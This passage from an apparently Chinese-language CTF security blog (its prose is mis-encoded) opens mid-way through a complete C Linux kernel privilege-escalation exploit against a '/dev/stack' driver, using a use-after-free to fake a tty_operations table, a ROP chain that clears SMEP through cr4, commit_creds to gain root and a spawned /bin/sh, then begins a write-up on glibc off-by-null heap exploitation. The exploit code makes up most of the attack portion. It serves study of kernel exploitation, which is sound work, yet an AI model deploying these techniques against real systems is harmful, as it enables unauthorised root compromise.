class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> user_rflags;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> user_sp;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> tty_size 0x2e0</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">addNote</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="keyword">size_t</span> len;</span><br><span class="line">    <span class="keyword">char</span>* data;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">editNote</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="keyword">size_t</span> idx;</span><br><span class="line">    <span class="keyword">size_t</span> len;</span><br><span class="line">    <span class="keyword">char</span>* data;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//ROP func</span></span><br><span class="line"><span class="function"><span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="title">findAddr</span><span class="params">()</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">save_state</span><span class="params">()</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">getroot</span> <span class="params">(<span class="keyword">void</span>)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">shell</span><span class="params">(<span class="keyword">void</span>)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//open dev</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">openDev</span><span class="params">(<span class="keyword">char</span>* pos)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">addFun</span><span class="params">(<span class="keyword">int</span> fd,struct addNote* arg)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">freeFun</span><span class="params">(<span class="keyword">int</span> fd,struct editNote* arg)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">editFun</span><span class="params">(<span class="keyword">int</span> fd,struct editNote* arg)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">readFun</span><span class="params">(<span class="keyword">int</span> fd,struct editNote* arg)</span></span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> *argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> fd,fd_tty;</span><br><span class="line">    <span class="keyword">char</span> buf[<span class="number">0x10</span>];</span><br><span class="line">    <span class="keyword">int</span> i = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> memOffset;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">addNote</span> <span class="title">addChunk</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">editNote</span> <span class="title">readChunk</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">editNote</span> <span class="title">editChunk</span>;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> smpOffset = <span class="number">0x1146000</span>;</span><br><span class="line">    memOffset = findAddr();</span><br><span class="line">    </span><br><span class="line">    <span class="comment">//debug kernel</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> vmBase = memOffset - smpOffset;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> pop_rdi_ret = vmBase + <span class="number">0x3d032d</span>;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> pop_rax_rbx_r12_r13_rbp_ret = vmBase + <span class="number">0x46c45e</span>;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> movCr4Rdi_pop_rbp_ret = vmBase + <span class="number">0x004c40</span>;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> movRspRax_decEbx_ret = vmBase + <span class="number">0x805115</span>;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> swapgs_sysret = (<span class="keyword">unsigned</span> <span class="keyword">long</span>)vmBase + <span class="number">0x60ba2</span>;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> swapgs_popRbp_ret = (<span class="keyword">unsigned</span> <span class="keyword">long</span>)vmBase + <span class="number">0x60394</span>;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> iretq = (<span class="keyword">unsigned</span> <span class="keyword">long</span>)vmBase + <span class="number">0x803857</span>;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> getR = (<span class="keyword">unsigned</span> <span class="keyword">long</span>)getroot;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> sh = (<span class="keyword">unsigned</span> <span class="keyword">long</span>)shell;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> sp;</span><br><span class="line">    <span class="keyword">size_t</span> rop[<span class="number">32</span>];</span><br><span class="line">    </span><br><span class="line">    commit_creds        = (<span class="keyword">commit_creds_t</span>)(vmBase + <span class="number">0x9f4a0</span>);</span><br><span class="line">    prepare_kernel_cred = (<span class="keyword">prepare_kernel_cred_t</span>)(vmBase + <span class="number">0x9f870</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">// unsigned long vmBase = memOffset - smpOffset;</span></span><br><span class="line">    <span class="comment">// unsigned long pop_rdi_ret = vmBase + 0xFE3542;</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">// unsigned long pop_rax_rbx_r12_rbp_ret = vmBase + 0x3794b9;</span></span><br><span class="line">    <span class="comment">// unsigned long movCr4Rax_pop_rbp_ret = vmBase + 0xe0e4;</span></span><br><span class="line">    <span class="comment">// unsigned long movRspRax_decEbx_ret = vmBase + 0x8841CF;</span></span><br><span class="line">    <span class="comment">// unsigned long getR = (unsigned long)getroot;</span></span><br><span class="line">    <span class="comment">// unsigned long swapgs_ret = (unsigned long)vmBase + 0x884188;</span></span><br><span class="line">    <span class="comment">// unsigned long iretq = (unsigned long)vmBase + 0x882d77;</span></span><br><span class="line">    <span class="comment">// unsigned long sh = (unsigned long)shell;</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">//print part</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;pop_rdi_ret:0x%llx\n&quot;</span>,pop_rdi_ret);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;movCr4Rdi_pop_rbp_ret:0x%llx\n&quot;</span>,movCr4Rdi_pop_rbp_ret);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;movRspRax_decEbx_ret:0x%llx\n&quot;</span>,movRspRax_decEbx_ret);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;iretq:0x%llx\n&quot;</span>,iretq);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">//open Dev</span></span><br><span class="line">    <span class="keyword">char</span>* pos = <span class="string">&quot;/dev/stack&quot;</span>;</span><br><span class="line">    fd = openDev(pos);</span><br><span class="line">    <span class="keyword">char</span> ttyBuf[tty_size] = &#123;<span class="string">&#x27;0&#x27;</span>&#125;;</span><br><span class="line">    addChunk.len = tty_size;</span><br><span class="line">    addChunk.data = ttyBuf;</span><br><span class="line">    addFun(fd,&amp;addChunk);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">void</span>* fake_tty_operations[<span class="number">30</span>];</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">30</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        fake_tty_operations[i] = movRspRax_decEbx_ret;</span><br><span class="line">    &#125;</span><br><span class="line">    fake_tty_operations[<span class="number">0</span>] = pop_rax_rbx_r12_r13_rbp_ret;</span><br><span class="line">    fake_tty_operations[<span class="number">1</span>] = (<span class="keyword">size_t</span>)rop;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">size_t</span> fake_tty_struct[<span class="number">4</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    fake_tty_struct[<span class="number">0</span>] = <span class="number">0x0000000100005401</span>;<span class="comment">//need to set magic number</span></span><br><span class="line">    fake_tty_struct[<span class="number">1</span>] = <span class="number">0</span>;</span><br><span class="line">    fake_tty_struct[<span class="number">2</span>] = <span class="number">0</span>;</span><br><span class="line">    fake_tty_struct[<span class="number">3</span>] = (<span class="keyword">size_t</span>)fake_tty_operations;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    editChunk.idx = <span class="number">0</span>;</span><br><span class="line">    editChunk.len = <span class="number">0x20</span>;</span><br><span class="line">    editChunk.data = fake_tty_struct;</span><br><span class="line">    </span><br><span class="line">    freeFun(fd,&amp;editChunk);</span><br><span class="line">    </span><br><span class="line">    pos = <span class="string">&quot;/dev/ptmx&quot;</span>;</span><br><span class="line">    fd_tty = openDev(pos);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;fd_tty:0x%d\n&quot;</span>,fd_tty);</span><br><span class="line">    editFun(fd, &amp;editChunk);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">//rop set</span></span><br><span class="line">    save_state();</span><br><span class="line">    rop[i++] = pop_rdi_ret;      <span class="comment">// pop_rax_rbx_r12_rbp_ret</span></span><br><span class="line">    rop[i++] = <span class="number">0x6f0</span>;</span><br><span class="line">    rop[i++] = movCr4Rdi_pop_rbp_ret;      <span class="comment">// mov cr4, rax; pop rbp; ret;</span></span><br><span class="line">    rop[i++] = <span class="number">0</span>;</span><br><span class="line">    rop[i++] = (<span class="keyword">size_t</span>)getR;</span><br><span class="line">    rop[i++] = swapgs_popRbp_ret;      <span class="comment">// swapgs;ret</span></span><br><span class="line">    rop[i++] = <span class="number">0x0</span>;</span><br><span class="line">    rop[i++] = iretq;      <span class="comment">// iretq</span></span><br><span class="line">    rop[i++] = (<span class="keyword">size_t</span>)sh;</span><br><span class="line">    rop[i++] = user_cs;                <span class="comment">/* saved CS */</span></span><br><span class="line">    rop[i++] = user_rflags;            <span class="comment">/* saved EFLAGS */</span></span><br><span class="line">    rop[i++] = user_sp;</span><br><span class="line">    rop[i++] = user_ss;</span><br><span class="line">    </span><br><span class="line">    write(fd_tty,buf,<span class="number">0x10</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">openDev</span><span class="params">(<span class="keyword">char</span>* pos)</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> fd;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[+] Open %s...\n&quot;</span>,pos);</span><br><span class="line">    <span class="keyword">if</span> ((fd = open(pos, O_RDWR)) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;    Can&#x27;t open device file: %s\n&quot;</span>,pos);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> fd;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">addFun</span><span class="params">(<span class="keyword">int</span> fd, struct addNote* arg)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    ioctl(fd,<span class="number">1</span>,arg);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">freeFun</span><span class="params">(<span class="keyword">int</span> fd, struct editNote* arg)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    ioctl(fd,<span class="number">888</span>,arg);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">editFun</span><span class="params">(<span class="keyword">int</span> fd, struct editNote* arg)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    ioctl(fd,<span class="number">3</span>,arg);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">readFun</span><span class="params">(<span class="keyword">int</span> fd, struct editNote* arg)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    ioctl(fd,<span class="number">4</span>,arg);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">save_state</span><span class="params">()</span> </span>&#123;</span><br><span class="line">   __asm__(<span class="string">&quot;mov %cs,user_cs;&quot;</span></span><br><span class="line">           <span class="string">&quot;mov %ss,user_ss;&quot;</span></span><br><span class="line">           <span class="string">&quot;mov %rsp,user_sp;&quot;</span></span><br><span class="line">           <span class="string">&quot;pushf;&quot;</span></span><br><span class="line">           <span class="string">&quot;pop user_rflags;&quot;</span></span><br><span class="line">           );</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;user states have been saved!!&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">shell</span><span class="params">(<span class="keyword">void</span>)</span> </span>&#123;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;[+] getuid() ...&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span>(!getuid()) &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot; [root]\n[+] Enjoy your shell...\n&quot;</span>);</span><br><span class="line">    system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[+] not root\n[+] failed !!!\n&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* function to get root id */</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">getroot</span> <span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  commit_creds(prepare_kernel_cred(<span class="number">0</span>));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="title">findAddr</span><span class="params">()</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">char</span> line[<span class="number">512</span>];</span><br><span class="line">    <span class="keyword">char</span> <span class="built_in">string</span>[] = <span class="string">&quot;Freeing SMP alternatives memory&quot;</span>;</span><br><span class="line">    <span class="keyword">char</span> found[<span class="number">17</span>];</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> addr=<span class="number">0</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">/* execute dmesg and place result in a file */</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[+] Excecute dmesg...\n&quot;</span>);</span><br><span class="line">    system(<span class="string">&quot;dmesg &gt; /tmp/dmesg&quot;</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[+] Find usefull addr...\n&quot;</span>);</span><br><span class="line">    FILE* file = fopen(<span class="string">&quot;/tmp/dmesg&quot;</span>, <span class="string">&quot;r&quot;</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">while</span> (fgets(line, <span class="keyword">sizeof</span>(line), file)) &#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="built_in">strstr</span>(line,<span class="built_in">string</span>)) &#123;</span><br><span class="line">            <span class="built_in">strncpy</span>(found,line+<span class="number">53</span>,<span class="number">16</span>);</span><br><span class="line">            <span class="built_in">sscanf</span>(found,<span class="string">&quot;%p&quot;</span>,(<span class="keyword">void</span> **)&amp;addr);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    fclose(file);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span>(addr==<span class="number">0</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;    dmesg error...\n&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> addr;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>


        <h2 id="æ‰§è¡Œæµç¨‹"   >
          <a href="#æ‰§è¡Œæµç¨‹" class="heading-link"><i class="fas fa-link"></i></a><a href="#æ‰§è¡Œæµç¨‹" class="headerlink" title="æ‰§è¡Œæµç¨‹"></a>æ‰§è¡Œæµç¨‹</h2>
      <p>è¿™é‡Œè¿˜å¾—è¯´ä¸€ä¸‹æ‰§è¡Œæµç¨‹ï¼Œæ¯”è¾ƒä¸å¥½è°ƒè¯•</p>
<p>å³å…ˆæ˜¯ä¾æ®writeå‡½æ•°è·³è½¬åˆ°æˆ‘ä»¬æœ€å¼€å§‹è®¾ç½®çš„gadgetï¼Œä¹Ÿå°±æ˜¯movRspRax_decEbx_retï¼Œç„¶åå°†æ ˆåŠ«æŒä¸ºfake_tty_operationsã€‚ä¹‹åå†è·³è½¬åˆ°pop_rax_rbx_r12_r13_rbp_retï¼Œå°†ROPèµ‹å€¼ç»™raxï¼Œå†retåˆ°</p>
<p>movRspRax_decEbx_retï¼Œå†å°†æ ˆåŠ«æŒä¸ºROPï¼Œä¹‹åå°±retåˆ°ROPé“¾æ¡ä¸­çš„pop_rdi_retäº†ï¼Œä¹‹åæ‰§è¡Œæµå¯æ§ã€‚</p>

        <h1 id="â–²æ³¨æ„äº‹é¡¹ï¼š"   >
          <a href="#â–²æ³¨æ„äº‹é¡¹ï¼š" class="heading-link"><i class="fas fa-link"></i></a><a href="#â–²æ³¨æ„äº‹é¡¹ï¼š" class="headerlink" title="â–²æ³¨æ„äº‹é¡¹ï¼š"></a>â–²æ³¨æ„äº‹é¡¹ï¼š</h1>
      <p>swapgs;retæ²¡æœ‰æ—¶ï¼Œå¯ä»¥ç”¨åŠ ä¸Špopçš„ï¼Œåªè¦æœ€åretåˆ°iretqå³å¯ã€‚åŒæ ·çš„gadgetå¯ä»¥ç›¸äº’è½¬æ¢ã€‚</p>
<p>iretqç±»ä¼¼äºretï¼Œç›´æ¥ä¸€ä¸ªæŒ‡ä»¤å³å¯ã€‚</p>
<p>å¯„å­˜å™¨ä¿å­˜éœ€è¦åœ¨è¿›å…¥å†…æ ¸ä¹‹å‰ã€‚</p>
<p>å †å—ç”³è¯·æ—¶çš„è§„åˆ™éœ€è¦æ˜¯<code>GFP_KERNEL</code>æ‰è¡Œï¼Œè‡³å°‘<code>GFP_DMA</code>ä¸è¡Œã€‚</p>
</div></div></article><article class="postlist-item post"><header class="post-header"><h1 class="post-title"><a class="post-title__link" href="/2021/08/31/off-by-null%E6%80%BB%E7%BB%93/">off-by-nullæ€»ç»“</a></h1><div class="post-meta"><span class="post-meta-item post-meta-item--createtime"><span class="post-meta-item__icon"><i class="far fa-calendar-plus"></i></span><span class="post-meta-item__info">Created</span><span class="post-meta-item__value">2021-08-31</span></span><span class="post-meta-item post-meta-item--updatetime"><span class="post-meta-item__icon"><i class="far fa-calendar-check"></i></span><span class="post-meta-item__info">Updated</span><span class="post-meta-item__value">2022-02-25</span></span></div></header><div class="post-body"><div class="post-excerpt">
        <h1 id="å‰è¨€"   >
          <a href="#å‰è¨€" class="heading-link"><i class="fas fa-link"></i></a><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h1>
      <p>off-by-nullæ˜¯å †ä¸­çš„å¸¸è§æ¼æ´ï¼Œå¾ˆå¤šæ—¶å€™éƒ½æ˜¯ç»“åˆå †å¸ƒå±€æ¥è¿›è¡Œåˆ©ç”¨çš„ã€‚è¿™é‡Œç»“åˆåŸç†è§£æã€ä¸åŒç‰ˆæœ¬å’Œæ¡ä»¶çš„off-by-nullä»¥åŠå¸¸è§çš„æ¼æ´æ¡ä»¶åšä¸ªæ€»ç»“ã€‚</p>

        <h1 id="ä¸€ã€åŸç†è§£æ"   >
          <a href="#ä¸€ã€åŸç†è§£æ" class="heading-link"><i class="fas fa-link"></i></a><a href="#ä¸€ã€åŸç†è§£æ" class="headerlink" title="ä¸€ã€åŸç†è§£æ"></a>ä¸€ã€åŸç†è§£æ</h1>
      <p>ä¸»è¦å‘ç”Ÿåœ¨<code>_int_free</code>çš„unlinkä¸­ï¼š</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//2.23 when size&gt;global_max_fast</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* consolidate backward */</span></span><br><span class="line"><span class="keyword">if</span> (!prev_inuse(p)) &#123;</span><br><span class="line">    prevsize = p-&gt;prev_size;</span><br><span class="line">    size += prevsize;</span><br><span class="line">    p = chunk_at_offset(p, -((<span class="keyword">long</span>) prevsize));</span><br><span class="line">    unlink(av, p, bck, fwd);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (nextchunk != av-&gt;top) &#123;</span><br><span class="line">    <span class="comment">/* get and clear inuse bit */</span></span><br><span class="line">    nextinuse = inuse_bit_at_offset(nextchunk, nextsize);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* consolidate forward */</span></span><br><span class="line">    <span class="keyword">if</span> (!nextinuse) &#123;</span><br><span class="line">        unlink(av, nextchunk, bck, fwd);</span><br><span class="line">        size += nextsize;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line">    </span><br><span class="line"><span class="comment">/* Take a chunk off a bin list */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> unlink(AV, P, BK, FD) &#123;                                             </span></span><br><span class="line">    FD = P-&gt;fd;								       </span><br><span class="line">    BK = P-&gt;bk;								       </span><br><span class="line">    <span class="keyword">if</span> (__builtin_expect (FD-&gt;bk != P || BK-&gt;fd != P, <span class="number">0</span>))		       </span><br><span class="line">        malloc_printerr (check_action, <span class="string">&quot;corrupted double-linked list&quot;</span>, P, AV);   </span><br><span class="line">    <span class="keyword">else</span> &#123;								       </span><br><span class="line">        FD-&gt;bk = BK;							       </span><br><span class="line">        BK-&gt;fd = FD;							       </span><br><span class="line">        <span class="keyword">if</span> (!in_smallbin_range (P-&gt;size)				       </span><br><span class="line">            &amp;&amp; __builtin_expect (P-&gt;fd_nextsize != <span class="literal">NULL</span>, <span class="number">0</span>)) </span><br><span class="line">        &#123;		       </span><br><span class="line">            <span class="keyword">if</span> (__builtin_expect (P-&gt;fd_nextsize-&gt;bk_nextsize != P, <span class="number">0</span>)	       </span><br><span class="line">                || __builtin_expect (P-&gt;bk_nextsize-&gt;fd_nextsize != P, <span class="number">0</span>))     </span><br><span class="line">                malloc_printerr (check_action,				       </span><br><span class="line">                                 <span class="string">&quot;corrupted double-linked list (not small)&quot;</span>,     </span><br><span class="line">                                 P, AV);					       </span><br><span class="line">            <span class="keyword">if</span> (FD-&gt;fd_nextsize == <span class="literal">NULL</span>) &#123;				       </span><br><span class="line">                <span class="keyword">if</span> (P-&gt;fd_nextsize == P)				       </span><br><span class="line">                    FD-&gt;fd_nextsize = FD-&gt;bk_nextsize = FD;		       </span><br><span class="line">                <span class="keyword">else</span> &#123;							       </span><br><span class="line">                    FD-&gt;fd_nextsize = P-&gt;fd_nextsize;			       </span><br><span class="line">                    FD-&gt;bk_nextsize = P-&gt;bk_nextsize;			       </span><br><span class="line">                    P-&gt;fd_nextsize-&gt;bk_nextsize = FD;			       </span><br><span class="line">                    P-&gt;bk_nextsize-&gt;fd_nextsize = FD;			       </span><br><span class="line">                &#125;							       </span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;							       </span><br><span class="line">                P-&gt;fd_nextsize-&gt;bk_nextsize = P-&gt;bk_nextsize;		       </span><br><span class="line">                P-&gt;bk_nextsize-&gt;fd_nextsize = P-&gt;fd_nextsize;		       </span><br><span class="line">            &#125;								       </span><br><span class="line">        &#125;								       </span><br><span class="line">    &#125;</span><br><span class="line">&#125;    </span><br></pre></td></tr></table></div></figure>

<p>ä¸ºäº†æ–¹ä¾¿ï¼Œä¾æ®ç‰©ç†åœ°å€ç›¸é‚»æ¥å‘½åå¦‚ä¸‹ï¼š</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/20210831114803.png" alt="Snipaste_2021-08-31_11-47-47"></p>
<p>å³å½“sizeå¤§äºglobal_max_fastä¸”ä¸æ˜¯mmapå‡ºæ¥çš„chunkæ—¶ï¼Œå°±ä¼šè¿›å…¥åˆ¤æ–­ã€‚æ‰€ä»¥è¿™é‡Œæˆ‘ä»¬è¿›è¡Œé‡Šæ”¾ç”¨çš„chunkçš„å¤§å°å°±å¿…é¡»è¦å¤§äºglobal_max_fastæ‰è¡Œï¼Œå¦åˆ™å°±æ˜¯æ”¹æ‰äº†pre_inuseä½ä¹Ÿæ˜¯ç›´æ¥è¿›å…¥fastbinï¼Œä¸ä¼šè¿›å…¥åˆ¤æ–­çš„ã€‚</p>
<ul>
<li><p>å…ˆä¾æ®å½“å‰chunk(chunkP)çš„pre_inuseä½æ¥åˆ¤æ–­å‰ä¸€ä¸ªchunk(preChunk)æ˜¯å¦å¤„äºé‡Šæ”¾çŠ¶æ€ï¼Œæ˜¯åˆ™è¿›å…¥unlinkï¼Œå°†å‰ä¸€ä¸ªchunkå–å‡º</p>
</li>
<li><p>ç„¶ååˆ¤æ–­ä¸‹ä¸€ä¸ªchunk(nextChunk)æ˜¯å¦æ˜¯top_chunkï¼Œæ˜¯åˆ™ç›´æ¥ä¸top_chunkåˆå¹¶ã€‚</p>
</li>
<li><p>è‹¥nextChunkä¸ä¸ºtop_chunkï¼Œå†åˆ¤æ–­ä¸‹ä¸€ä¸ªChunkçš„å†ä¸‹ä¸€ä¸ªchunkçš„pre_inuseä½æ¥åˆ¤æ–­nextChunkæ˜¯å¦å¤„äºé‡Šæ”¾çŠ¶æ€ï¼Œè‹¥æ˜¯åˆ™è¿›å…¥unlinkã€‚</p>
</li>
</ul>
<p>ç„¶åunlinkä¸­å°±ä¸ç»†è¯´ï¼Œå°±æ˜¯åŒå‘å¾ªç¯é“¾è¡¨è§£é“¾çš„è¿‡ç¨‹ï¼Œä¾æ®fdå’Œbkæ¥æŸ¥æ‰¾å¹¶è§£é“¾ï¼Œä½†æ˜¯æˆ‘ä»¬çš„off-by-nullé€šå¸¸ä¸ä¼šæ¶‰åŠåˆ°nextsizeä½çš„ä½¿ç”¨ï¼Œæ‰€ä»¥åŸºæœ¬ä¸ç”¨çœ‹åé¢çš„ã€‚éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œç”±äºè¿™é‡Œä¼šæ£€æŸ¥ï¼Œå³ï¼š</p>
<pre><code>if (__builtin_expect (FD-&gt;bk != P || BK-&gt;fd != P, 0))               
    malloc_printerr (check_action, &quot;corrupted double-linked list&quot;, P, AV);
</code></pre>
<p>æ‰€ä»¥æˆ‘ä»¬éœ€è¦å°†è¿›å…¥unlinkçš„chunkçš„fdå’Œbkæ¥è¿›è¡Œä¼ªé€ æˆ–è€…å¹²è„†ç›´æ¥é‡Šæ”¾ä½¿å…¶ç›´æ¥è¿›å…¥unsortedbinä¸­å®ŒæˆåŒå‘é“¾è¡¨çš„åŠ æŒã€‚è¿™é‡Œå…ˆè®²æ”¾å…¥unsortedbinä¸­æ¥è·å–fdå’Œbkçš„æ–¹æ³•ï¼Œä¼ªé€ çš„æ–¹æ³•ä¸€èˆ¬ç”¨åœ¨2.29åŠä»¥ä¸Šçš„é«˜ç‰ˆæœ¬ä¸­ï¼Œå› ä¸ºé‚£æ—¶å€™çš„unlinkåŠ å…¥äº†å…³äºsizeä½çš„æ£€æŸ¥ï¼Œä¸èƒ½ç®€å•å¾—ä¼ªé€ fdå’Œbkã€‚</p>
<p>å…¶æ¬¡ï¼Œè¿™é‡Œè¿˜éœ€è¦æ˜ç™½ä¸€ä¸ªå¯»æ‰¾chunkçš„åŸç†ã€‚</p>
<ul>
